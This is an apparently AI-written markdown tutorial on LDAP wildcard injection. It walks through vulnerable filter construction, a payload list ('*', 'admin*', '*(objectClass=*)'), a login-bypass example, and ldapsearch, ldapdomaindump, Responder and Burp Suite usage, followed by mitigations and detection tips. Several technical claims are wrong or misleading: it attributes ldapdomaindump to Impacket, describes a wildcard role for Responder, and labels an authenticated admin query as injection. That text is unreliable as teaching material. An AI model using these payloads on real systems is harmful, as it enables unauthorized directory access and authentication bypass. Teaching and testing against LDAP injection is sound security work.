Here's a markdown (MD) outline detailing **LDAP Wildcard Injection Attacks**, their mechanics, tools, and mitigation strategies:

---

# **LDAP Wildcard Injection Attack**

## **Understanding LDAP Wildcard Injection**

- **LDAP Wildcard Injection** is a form of LDAP Injection where attackers exploit the use of wildcards (`*`) in LDAP queries to bypass authentication or extract sensitive information.
- By injecting wildcards, attackers can manipulate LDAP filters to return **all entries** instead of the intended specific match.
- This attack is simple yet highly effective if input validation is missing or improperly implemented.

---

## **How LDAP Wildcard Injection Works**

1. **LDAP Query Basics:**

   - A normal LDAP filter might look like this:
     ```
     (cn=John Doe)
     ```
   - A vulnerable filter that accepts unsanitized input:
     ```
     (&(cn={user_input})(objectClass=user))
     ```
   - **Malicious Input:**
     ```
     *
     ```
   - **Resulting Query:**
     ```
     (&(cn=*)(objectClass=user))
     ```
   - This query returns **all users** because `cn=*` matches any entry.

2. **Common Injection Payloads:**

   ```
   *
   admin*
   a*
   *(objectClass=*)
   ```

3. **Impact:**
   - **Bypass Authentication:** Log in as any user without credentials.
   - **Data Leakage:** Extract large amounts of data by exploiting filters with broad results.
   - **Privilege Escalation:** Gain unauthorized access to restricted accounts or services.

---

## **Tools and Techniques**

### **LDAPAdmin (GUI-Based Tool):**

- LDAPAdmin can be used to manually craft and test LDAP queries with wildcard inputs.
- **Download and Install:**
  ```
  https://www.ldapadmin.org/
  ```

---

### **Impacket (Python Library):**

- Impacket includes tools for interacting with LDAP directories programmatically.
- **LDAP Dump Example:**
  ```bash
  python3 ldapdomaindump.py -u <domain>/<user> -p <password> <dc_ip>
  ```
- **Injecting Wildcards:**
  ```bash
  ldapsearch -x -h <target_ip> -D "cn=admin,dc=example,dc=com" -W "(&(cn=*)(objectClass=user))"
  ```
  - This query dumps all users by injecting a wildcard.

---

### **Burp Suite (For Web-Based LDAP):**

- Burp Suite can intercept LDAP-based login requests and allow manual wildcard injections.
- **Steps:**
  1.  Intercept the login request.
  2.  Replace `username` with `*` or `admin*`.
  3.  Forward the request and observe the server response.

---

### **Responder (For NTLM to LDAP Exploits):**

- Responder can trick clients into responding to malicious LDAP queries by using wildcards to extract more data.
- **Basic Command:**
  ```bash
  sudo responder -I eth0
  ```

---

## **Example LDAP Wildcard Injection (Login Bypass)**

- **Web Form Input:**
  ```
  Username: *
  Password: anything
  ```
- **Resulting Query:**
  ```
  (&(cn=*)(objectClass=user))
  ```
- **Outcome:**
  - The attacker gains access to the first matched user, effectively bypassing authentication.

---

## **Mitigation Techniques**

- **Input Validation:**

  - Disallow wildcards (`*`) in user input for LDAP queries.
  - Use strict input validation with whitelisting.

- **Parameterized LDAP Queries:**

  - Use APIs that support **parameterized** or **prepared** LDAP queries to prevent direct manipulation.

- **Minimal Privileges:**

  - Limit LDAP query access to **essential attributes** and restrict directory-level access.

- **Error Handling:**

  - Avoid exposing LDAP errors directly to users. Suppress or generalize error messages to prevent information leakage.

- **Access Control:**

  - Apply **role-based access controls (RBAC)** to limit which attributes can be queried.
  - Restrict access to sensitive attributes like `userPassword`, `objectClass`, etc.

- **Regular Audits:**

  - Perform periodic **security audits** of LDAP directories to ensure misconfigurations are identified and fixed.

- **WAF and IDS:**
  - Deploy Web Application Firewalls (WAF) and Intrusion Detection Systems (IDS) to detect and block wildcard injections.

---

## **Testing and Detection**

- **Burp Suite:**
  - Intercept and test login forms by injecting `*` or `admin*`.
- **OWASP ZAP:**
  - Automate wildcard injection testing on LDAP-backed web applications.
- **Wireshark:**
  - Monitor LDAP traffic for unusual wildcard patterns.
- **Splunk (SIEM):**
  - Set up LDAP query anomaly detection for wildcard-heavy queries.

---

## **Example LDAP Wildcard Injection Test (ldapsearch):**

- **Basic ldapsearch Command:**
  ```bash
  ldapsearch -x -LLL -h <target_ip> -D "cn=admin,dc=example,dc=com" -W -b "dc=example,dc=com" "cn=*"
  ```
  - Returns all users by injecting `*` into the `cn` field.

---

## **⚠️Disclaimer⚠️**

This guide is for **educational purposes only**. Unauthorized LDAP manipulation is illegal and unethical. Always conduct penetration testing with proper authorization and adhere to legal boundaries.
